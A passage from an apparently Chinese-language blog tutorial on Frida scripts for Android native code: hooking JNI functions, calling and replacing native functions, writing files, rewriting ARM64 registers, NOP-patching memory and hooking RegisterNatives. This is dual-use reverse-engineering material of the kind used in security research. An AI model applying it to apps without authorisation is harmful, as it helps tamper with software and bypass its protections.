class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest10</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> artSym = <span class="title class_">Module</span>.<span class="title function_">enumerateSymbols</span>(<span class="string">&quot;libart.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">NewStringUTFAddr</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; artSym.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(artSym[i].<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span> &amp;&amp; artSym[i].<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;NewStringUTF&quot;</span>) != -<span class="number">1</span>)&#123;    <span class="comment">//libart中jni函数是不带有CheckJNI的</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(artSym[i]));</span><br><span class="line">            <span class="title class_">NewStringUTFAddr</span> = artSym[i].<span class="property">address</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">NewStringUTFAddr</span> != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">NewStringUTFAddr</span>,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">1</span>].<span class="title function_">readCString</span>());</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-jni函数-计算地址方式"><a href="#Hook-jni函数-计算地址方式" class="headerlink" title="Hook jni函数 (计算地址方式)"></a>Hook jni函数 (计算地址方式)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest9</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//查看app是多少位 64位指针8字节 32位指针4字节</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Process.arch: &quot;</span>, <span class="title class_">Process</span>.<span class="property">arch</span>);  </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>()));</span><br><span class="line">        <span class="comment">//(*(*a1 + 1336LL))(a1, a2);</span></span><br><span class="line">        <span class="comment">//*a1</span></span><br><span class="line">        <span class="keyword">var</span> envAddr = <span class="title function_">ptr</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="property">handle</span>).<span class="title function_">readPointer</span>();</span><br><span class="line">        <span class="comment">//*(*a1 + 1336LL)</span></span><br><span class="line">        <span class="comment">//这个jni函数相对偏移地址 0x538 (通过看jni.h--&gt;（在结构体中的位置-1）*4或8)</span></span><br><span class="line">        <span class="keyword">var</span> newStringUtfAddr = envAddr.<span class="title function_">add</span>(<span class="number">0x538</span>).<span class="title function_">readPointer</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newStringUtfAddr&quot;</span>, newStringUtfAddr);</span><br><span class="line">        <span class="keyword">if</span>(newStringUtfAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(newStringUtfAddr,&#123;</span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">1</span>].<span class="title function_">readCString</span>());</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="so层主动调用任意函数"><a href="#so层主动调用任意函数" class="headerlink" title="so层主动调用任意函数"></a>so层主动调用任意函数</h2><p>Java.vm.tryGetEnv要么放在API中(Interceptor.attach)，要么用Java.perform包起来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest11</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//拿到函数地址</span></span><br><span class="line">        <span class="keyword">var</span> funcAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x23F4</span>);</span><br><span class="line">        <span class="comment">//声明函数指针</span></span><br><span class="line">        <span class="keyword">var</span> func = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(funcAddr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">        <span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;env: &quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(env));</span><br><span class="line">        <span class="keyword">if</span>(env != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> jstr = env.<span class="title function_">newStringUtf</span>(<span class="string">&quot;abcgda&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> cstr = <span class="title function_">func</span>(env, jstr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(cstr.<span class="title function_">readCString</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(cstr));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="替换so层某个函数的功能"><a href="#替换so层某个函数的功能" class="headerlink" title="替换so层某个函数的功能"></a>替换so层某个函数的功能</h2><p>使用 Interceptor.replace(target, replacement[, data])</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_Interceptor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">       <span class="comment">//这个c_getSum方法有两个int参数、返回结果为两个参数相加</span></span><br><span class="line">       <span class="comment">//这里用NativeFunction函数自己定义了一个c_getSum函数</span></span><br><span class="line">       <span class="keyword">var</span> add_method = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libhello.so&#x27;</span>, <span class="string">&#x27;c_getSum&#x27;</span>), </span><br><span class="line">       <span class="string">&#x27;int&#x27;</span>,[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line">       <span class="comment">//输出结果 那结果肯定就是 3</span></span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result:&quot;</span>,<span class="title function_">add_method</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">       <span class="comment">//这里对原函数的功能进行替换实现</span></span><br><span class="line">       <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(add_method, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">           <span class="comment">//h不论是什么参数都返回123</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">       &#125;, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]));</span><br><span class="line">       <span class="comment">//再次调用 则返回123</span></span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result:&quot;</span>,<span class="title function_">add_method</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="writePointer-ptr"><a href="#writePointer-ptr" class="headerlink" title="writePointer(ptr)"></a>writePointer(ptr)</h2><p>读取ptr指针地址到当前指针</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//先打印pointer指针地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pointer :&quot;</span>+pointer);</span><br><span class="line"><span class="comment">//分配四个字节的空间地址</span></span><br><span class="line"><span class="keyword">const</span> r = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">4</span>);</span><br><span class="line"><span class="comment">//将pointer指针写入刚刚申请的r内</span></span><br><span class="line">r.<span class="title function_">writePointer</span>(pointer);</span><br><span class="line"><span class="comment">//读取r指针的数据</span></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="title class_">Memory</span>.<span class="title function_">readByteArray</span>(r, <span class="number">4</span>);</span><br><span class="line"><span class="comment">//r指针内放的pointer指针地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buffer);</span><br><span class="line"></span><br><span class="line">输出如下。</span><br><span class="line"><span class="comment">//console.log(&quot;pointer :&quot;+pointer); 这句打印的地址 也就是libc的地址</span></span><br><span class="line">pointer :<span class="number">0xf588f000</span></span><br><span class="line"><span class="comment">//console.log(buffer); 输出buffer 0xf588f000在内存数据会以00 f0 88 f5方式显示</span></span><br><span class="line">           <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span>  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00</span> f0 <span class="number">88</span> f5              </span><br></pre></td></tr></table></figure><h2 id="readPointer"><a href="#readPointer" class="headerlink" title="readPointer()"></a>readPointer()</h2><p>从此内存位置读取<code>NativePointer</code>，示例代码如下。省略<code>function</code>以及<code>Java.perform</code>~</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pointer = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libc.so&quot;</span>).<span class="property">base</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pointer.<span class="title function_">readByteArray</span>(<span class="number">0x10</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;readPointer():&quot;</span>+pointer.<span class="title function_">readPointer</span>());</span><br><span class="line">输出如下。</span><br><span class="line"><span class="title function_">readPointer</span>():<span class="number">0x464c457f</span></span><br><span class="line"></span><br><span class="line">也就是将readPointer的前四个字节的内容转成地址产生一个新的<span class="title class_">NativePointer</span>。</span><br></pre></td></tr></table></figure><h2 id="Frida-API-写文件"><a href="#Frida-API-写文件" class="headerlink" title="Frida API 写文件"></a>Frida API 写文件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest12</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> ios = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/sdcard/a.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    ios.<span class="title function_">write</span>(<span class="string">&quot;asdfg\n&quot;</span>);</span><br><span class="line">    ios.<span class="title function_">flush</span>();</span><br><span class="line">    ios.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-libc-so-写文件"><a href="#Hook-libc-so-写文件" class="headerlink" title="Hook libc.so 写文件"></a>Hook libc.so 写文件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest13</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">//获得libc中导出函数地址 </span></span><br><span class="line">    <span class="keyword">var</span> addr_fopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> addr_fputs = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fputs&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> addr_fclose = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fclose&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addr_fopen:&quot;</span>, addr_fopen, <span class="string">&quot;addr_fputs:&quot;</span>, addr_fputs, <span class="string">&quot;addr_fclose:&quot;</span>, addr_fclose);</span><br><span class="line">    <span class="keyword">var</span> fopen = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fopen, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    <span class="keyword">var</span> fputs = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fputs, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    <span class="keyword">var</span> fclose = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fclose, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> filename = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;/sdcard/a.txt&quot;</span>); <span class="comment">//定义一个so 字符串 文件名</span></span><br><span class="line">    <span class="keyword">var</span> open_mode = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> file = <span class="title function_">fopen</span>(filename, open_mode);  <span class="comment">//文件句柄</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fopen:&quot;</span>, file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> buffer = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;asd\n&quot;</span>); <span class="comment">//写的内容</span></span><br><span class="line">    <span class="keyword">var</span> retval = <span class="title function_">fputs</span>(buffer, file);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fputs:&quot;</span>, retval);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">fclose</span>(file);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="inlineHook与寄存器Hook"><a href="#inlineHook与寄存器Hook" class="headerlink" title="inlineHook与寄存器Hook"></a>inlineHook与寄存器Hook</h2><p>arm64中 结果放在x0中， w0是x0的低32位   inlinehook在64位下比较稳定</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest14</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">    <span class="keyword">var</span> sub_2894 = soAddr.<span class="title function_">add</span>(<span class="number">0x2894</span>); <span class="comment">//函数地址计算 thumb+1 ARM不加</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sub_2894);</span><br><span class="line">    <span class="keyword">if</span>(sub_2894 != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_2894,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>.<span class="title function_">toInt32</span>());</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span> = <span class="number">0x1000</span>;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>.<span class="title function_">toInt32</span>());</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sub_2858 = soAddr.<span class="title function_">add</span>(<span class="number">0x2858</span>); <span class="comment">//函数地址计算 thumb+1 ARM不加</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sub_2858);</span><br><span class="line">    <span class="keyword">if</span>(sub_2858 != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_2858,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span> = soAddr.<span class="title function_">add</span>(<span class="number">0x2C35</span>); <span class="comment">//让这个指针参数指向另一个字符串地址</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="frida进行内存nop"><a href="#frida进行内存nop" class="headerlink" title="frida进行内存nop"></a>frida进行内存nop</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32位Thumb</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">nop</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(<span class="title function_">ptr</span>(addr), <span class="number">4</span>, <span class="function"><span class="params">code</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> cw = <span class="keyword">new</span> <span class="title class_">ThumbWriter</span>(code, &#123; <span class="attr">pc</span>: <span class="title function_">ptr</span>(addr) &#125;);</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">flush</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//64位</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">nop</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(<span class="title function_">ptr</span>(addr), <span class="number">4</span>,</span><br><span class="line">            <span class="function"><span class="params">code</span>=&gt;</span>  &#123;</span><br><span class="line">        <span class="keyword">const</span> cw = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(code, &#123; <span class="attr">pc</span>: <span class="title function_">ptr</span>(addr) &#125;);</span><br><span class="line">        <span class="comment">// const cw = new ThumbWriter(code, &#123; pc: ptr(addr) &#125;);</span></span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">flush</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="native层调用栈打印"><a href="#native层调用栈打印" class="headerlink" title="native层调用栈打印"></a>native层调用栈打印</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(f, &#123;</span><br><span class="line">  <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;RegisterNatives called from:\n&#x27;</span> +</span><br><span class="line">        <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>) <span class="comment">// 或者Backtracer.FUZZY</span></span><br><span class="line">        .<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Hook-RegisterNative"><a href="#Hook-RegisterNative" class="headerlink" title="Hook RegisterNative"></a>Hook RegisterNative</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_libart</span>(<span class="params"></span>) &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> module_libart = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>);</span><br><span class="line">    <span class="comment">//枚举所有的文件来找到</span></span><br><span class="line">    <span class="comment">//首先找到so</span></span><br><span class="line">    <span class="keyword">var</span> symbols = module_libart.<span class="title function_">enumerateSymbols</span>();   </span><br><span class="line">     <span class="comment">//枚举模块的符号</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> addr_RegisterNatives = <span class="literal">null</span>;      </span><br><span class="line">     <span class="comment">// 怎么hook RegisterNatives</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> name = symbols[i].<span class="property">name</span>;</span><br><span class="line">        <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&quot;art&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((name.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span>) &amp;&amp; (name.<span class="title function_">indexOf</span>(<span class="string">&quot;JNI&quot;</span>) &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">                 <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&quot;RegisterNatives&quot;</span>) &gt;= <span class="number">0</span>) &#123;<span class="comment">//找到函数的名字</span></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">                    addr_RegisterNatives = symbols[i].<span class="property">address</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            